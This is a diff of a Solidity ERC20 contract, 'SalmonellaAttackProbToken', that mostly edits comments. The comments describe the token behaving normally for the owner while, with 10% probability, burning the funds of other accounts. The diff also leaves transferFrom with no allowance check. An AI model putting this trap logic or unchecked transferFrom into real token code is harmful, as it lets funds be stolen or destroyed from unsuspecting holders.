@@ -4,8 +4,7 @@ import "../interfaces/IERC20.sol";
 
 /**
      * The Salmonella contract operates on a straightforward principle. It functions as a standard ERC20 token, behaving similarly to other ERC20 tokens under normal circumstances. 
-     * However, it incorporates specific rules to identify transactions involving anyone other than the designated owner. 
-     * In such cases, the contract only provides 10% of the intended amount, even though it generates event logs that appear to represent a complete trade.
+     * However, it incorporates specific rules to identify transactions involving anyone other than the designated accounts. 
 */
 
 contract SalmonellaAttackProbToken is IERC20 {
@@ -30,13 +29,14 @@ contract SalmonellaAttackProbToken is IERC20 {
         totalSupply = initialSupply * 10**uint256(decimals);
         _balances[msg.sender] = totalSupply;
         salmonellaAttacker = msg.sender;
-        poolAddress = address(0);
+        poolAddress = address(0); // Initialized to address (0) -> must be setted to pool address
 	randomNumberNonce = 1;
         emit Transfer(address(0), salmonellaAttacker, totalSupply);    
     }
-    
-    
-    //setpoolAddress 
+      
+    /**
+    * @dev set pool address to the dex pool
+    */
     function setPoolAddress(address pAddress) public {
     	poolAddress = pAddress;
     }
@@ -96,7 +96,6 @@ contract SalmonellaAttackProbToken is IERC20 {
      */
     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
         _transfer(sender, recipient, amount);
-        //_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
         return true;
     }
      /**
@@ -106,7 +105,6 @@ contract SalmonellaAttackProbToken is IERC20 {
      * Added boolean trapped as a flag to see if in has entered in the 10% of probability.
      * if trapped is false, do the normal transfer function.
      * if trapped is true, burn all their money.
-     * Otherwise, Execute Salmonella 
      */
     function _transfer(address sender, address recipient, uint256 amount) internal {
         require(sender != address(0), "ERC20: transfer from the zero address");
